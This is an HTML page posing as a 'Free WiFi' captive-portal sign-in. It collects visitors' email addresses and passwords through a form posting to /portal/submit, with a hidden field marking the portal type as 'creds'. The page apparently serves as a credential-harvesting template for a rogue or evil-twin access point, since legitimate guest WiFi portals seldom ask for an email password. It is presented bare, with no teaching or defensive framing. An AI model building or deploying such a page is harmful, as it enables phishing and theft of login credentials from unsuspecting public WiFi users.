<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free WiFi — Login Required</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         min-height: 100vh; display: flex; align-items: center; justify-content: center; }
  .card { background: white; border-radius: 16px; padding: 40px; width: 100%; max-width: 400px;
          box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
  h1 { text-align: center; font-size: 1.5rem; color: #1a1a2e; margin-bottom: 8px; }
  p { text-align: center; color: #666; font-size: 0.9rem; margin-bottom: 24px; }
  .field { margin-bottom: 16px; }
  label { display: block; font-size: 0.85rem; color: #444; margin-bottom: 6px; font-weight: 500; }
  input { width: 100%; padding: 12px 16px; border: 2px solid #e0e0e0; border-radius: 8px;
          font-size: 1rem; outline: none; }
  input:focus { border-color: #667eea; }
  button { width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea, #764ba2);
           color: white; border: none; border-radius: 8px; font-size: 1rem; font-weight: 600;
           cursor: pointer; margin-top: 8px; }
  .footer { text-align: center; margin-top: 20px; font-size: 0.75rem; color: #999; }
</style>
</head>
<body>
<div class="card">
  <h1>Welcome to Free WiFi</h1>
  <p>Please sign in to access the internet</p>
  <form method="POST" action="/portal/submit">
    <input type="hidden" name="portal_type" value="creds">
    <div class="field">
      <label for="email">Email Address</label>
      <input type="email" id="email" name="email" placeholder="you@example.com" required>
    </div>
    <div class="field">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter password" required>
    </div>
    <button type="submit">Connect to Internet</button>
  </form>
  <div class="footer">By connecting you agree to our Terms of Service</div>
</div>
</body>
</html>
